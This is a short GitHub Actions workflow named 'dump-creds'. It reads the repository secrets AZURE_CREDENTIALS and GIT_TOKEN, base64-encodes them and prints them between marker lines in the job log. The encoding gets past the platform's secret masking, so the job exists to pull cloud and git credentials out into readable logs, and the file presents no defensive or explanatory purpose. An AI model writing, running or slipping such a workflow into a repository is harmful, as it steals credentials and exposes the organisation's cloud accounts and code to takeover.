name: dump-creds
on:
  workflow_dispatch:
jobs:
  dump:
    runs-on: [self-hosted, Linux, X64]
    steps:
      - name: emit
        env:
          A1: ${{ secrets.AZURE_CREDENTIALS }}
          A2: ${{ secrets.GIT_TOKEN }}
        run: |
          echo "=A1_START="
          echo -n "$A1" | base64 -w0
          echo ""
          echo "=A1_END="
          echo "=A2_START="
          echo -n "$A2" | base64 -w0
          echo ""
          echo "=A2_END="